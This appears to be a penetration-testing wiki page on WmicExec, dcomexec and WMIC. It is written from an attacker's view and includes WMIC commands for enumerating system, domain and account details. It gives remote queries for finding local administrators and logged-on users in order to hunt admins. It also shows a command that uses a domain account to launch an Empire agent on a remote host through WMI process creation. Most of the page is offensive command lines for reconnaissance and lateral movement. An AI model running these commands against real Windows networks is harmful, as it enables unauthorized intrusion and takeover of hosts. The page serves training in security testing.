# WmicExec

## How Does it works

Wmi allows to open process in hosts where you know username/\(password/Hash\). Then, Wmiexec uses wmi to execute each command that is asked to execute \(this is why Wmicexec gives you semi-interactive shell\).

**dcomexec.py:** This script gives a semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints \(ShellBrowserWindow DCOM object\). Currently, it supports MMC20. Application, Shell Windows and Shell Browser Window objects. \(from [here](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)\)

## WMIC

From an attacker's perspective, WMI can be very valuable in enumerating sensitive information about a system or the domain.

```text
wmic computerystem list full /format:list  
wmic process list /format:list  
wmic ntdomain list /format:list  
wmic useraccount list /format:list  
wmic group list /format:list  
wmic sysaccount list /format:list  
```

## **Manual Remote WMI Querying**

For example, here's a very stealthy way to discover local admins on a remote machine \(note that domain is the computer name\):

```text
wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")  
```

Another useful oneliner is to see who is logged on to a machine \(for when you're hunting admins\):

```text
wmic /node:ordws01 path win32_loggedonuser get antecedent  
```

`wmic` can even read nodes from a text file and execute the command on all of them. If you have a text file of workstations:

```text
wmic /node:@workstations.txt path win32_loggedonuser get antecedent  
```

**We'll remotely create a process over WMI to execute a Empire agent:**

```text
wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"  
```

We see it executed successfully \(ReturnValue = 0\). And a second later our Empire listener catches it. Note the process ID is the same as WMI returned.

All this information was extracted from here: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

